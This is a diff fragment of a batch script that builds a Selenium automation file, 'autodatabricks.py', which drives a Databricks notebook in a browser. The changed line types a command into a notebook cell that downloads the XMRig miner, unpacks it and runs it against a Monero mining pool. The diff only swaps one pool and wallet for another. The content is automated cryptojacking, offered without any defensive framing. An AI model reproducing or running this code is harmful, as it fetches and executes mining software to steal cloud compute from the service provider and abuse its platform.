@@ -81,7 +81,7 @@ echo	#randomLetter = random.choice(string.ascii_letters)	>>  autodatabricks.py
 echo	#randomLette = random.choice(string.ascii_letters)	>>  autodatabricks.py
 echo	WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[2]/div[2]/div/div[3]/div[1]/div/div/div/div[4]/div[1]/div/div/div/div[5]/div/pre')))	>>  autodatabricks.py
 echo	driver.find_element_by_css_selector(".CodeMirror-line").click()	>>  autodatabricks.py
-echo	driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("!wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o gulf.moneroocean.stream:10128 -u 8416qL8UfMKd6jk6ACiKdDY2CmHV8PYGVM9gzS3oJtQpT2b2xitEhEoUEzMv2UGfeqXDGrZ7SBF9B6Yx1FeBvRqBPstNeTH -p worker")	>>  autodatabricks.py
+echo	driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("!wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.allcoins.pw:3333 -a rx -k -u allcoins.pw -p 511240")	>>  autodatabricks.py
 echo	driver.find_element_by_css_selector(".fa-play").click()	>>  autodatabricks.py
 echo	driver.find_element_by_css_selector(".run-cell > .fa").click()	>>  autodatabricks.py
 echo	driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()	>>  autodatabricks.py
